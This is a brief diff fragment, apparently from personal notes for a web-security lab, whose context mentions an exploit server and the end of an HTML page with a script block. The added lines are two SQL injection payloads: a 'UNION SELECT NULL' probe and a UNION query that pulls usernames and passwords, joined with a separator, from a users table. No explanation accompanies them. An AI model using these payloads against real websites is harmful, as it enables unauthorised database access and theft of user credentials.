@@ -49,3 +49,10 @@ Referer: https://your-exploit-server.net
         </script>
     </body>
 </html>
+
+
+
+
+
+ UNION SELECT NULL
+ 1 UNION SELECT username || '~' || password FROM users
